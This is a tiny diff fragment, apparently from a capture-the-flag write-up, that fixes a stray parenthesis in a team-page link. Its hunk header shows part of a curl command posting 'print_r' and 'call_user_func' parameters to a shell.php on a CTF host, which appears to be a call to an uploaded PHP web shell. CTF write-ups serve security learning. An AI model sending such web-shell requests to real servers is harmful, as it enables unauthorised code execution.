@@ -87,4 +87,4 @@ curl https://host.ctf.com/shell.php -X POST -F "0=print_r" -F "1=call_user_func_
 
 Cli-Ish over and out.
 
-PS: Checkout our cool team page https://pwnprophecy.tk)
+PS: Checkout our cool team page https://pwnprophecy.tk
